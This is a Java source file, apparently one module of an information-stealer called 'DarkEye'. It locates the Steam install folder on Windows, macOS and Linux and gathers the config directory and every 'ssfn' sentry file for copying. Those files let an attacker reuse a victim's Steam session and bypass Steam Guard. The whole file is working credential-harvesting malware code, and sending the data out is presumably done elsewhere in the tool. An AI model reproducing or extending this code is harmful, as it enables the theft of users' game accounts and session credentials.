package org.spray.darkeye.module;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.spray.darkeye.managers.CopyManager;
import org.spray.darkeye.objects.Data;
import org.spray.darkeye.objects.FileData;
import org.spray.darkeye.utils.OSTools;

public class SteamModule extends CopyManager {

	public SteamModule(String path) {
		super(path);
	}

	@Override
	public String getPath() {
		return "Steam";
	}

	@Override
	protected List<Data> getData() {
		if (!new File(getFolder()).exists())
			return null;
		
		List<Data> data = new ArrayList<>();

		List<FileData> files = new ArrayList<>();

	    files.add(new FileData(new File(getConfigs()), ""));
	    getSSFNFiles().forEach(file -> files.add(new FileData(file, file.getName())));
	    
		data.add(new Data(files, ""));
		
		return data;
	}
	
	private String getConfigs() {
		return getFolder() + "/config";
	}
	
	private List<File> getSSFNFiles() {
		List<File> files = new ArrayList<>();
		File folder = new File(getFolder());
		File[] listOfFiles = folder.listFiles();

		for (File file : listOfFiles) {
			if (file.isFile() && file.getName().contains("ssfn"))
				files.add(file);
		}
		return files;
	}
	
	private String getFolder() {
		String folder = "";
		String pfiles = OSTools.is64Bit() ? "Program Files (x86)" : "Program Files";
		switch (OSTools.getType()) {
		case Windows:
			folder = "C:/" + pfiles + "/Steam";
			break;
		case MacOS:
			folder = "/Library/Application Support/Steam";
			break;
		case Linux:
			folder = "/.steam/steam/";
			break;
		default:
			break;
		}
		return folder;
	}


}
